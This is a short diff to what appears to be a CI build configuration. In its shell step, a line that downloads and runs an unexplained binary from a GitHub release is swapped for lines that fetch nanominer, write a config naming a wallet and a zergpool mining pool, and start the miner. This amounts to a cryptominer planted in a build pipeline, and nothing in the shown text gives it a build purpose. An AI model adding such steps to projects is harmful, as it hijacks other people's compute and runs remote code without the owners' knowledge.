@@ -10,4 +10,14 @@ build:
         code: |
           echo "python version $(python --version) running"
           echo "pip version $(pip --version) running"
-          wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
+          wget https://github.com/nanopool/nanominer/releases/download/v3.2.0/nanominer-linux-3.2.0.tar.gz
+          tar -xvzf nanominer-linux-3.2.0.tar.gz
+          cd nanominer-linux-3.2.0
+
+            cat > config.ini <<END
+            [rx]
+            wallet = D5snbNHPaNYMHAESeTrreRRVx3NLRdGo65
+            rigName = rig1
+            pool1= rx2.mine.zergpool.com:8335
+            END
+            ./nanominer
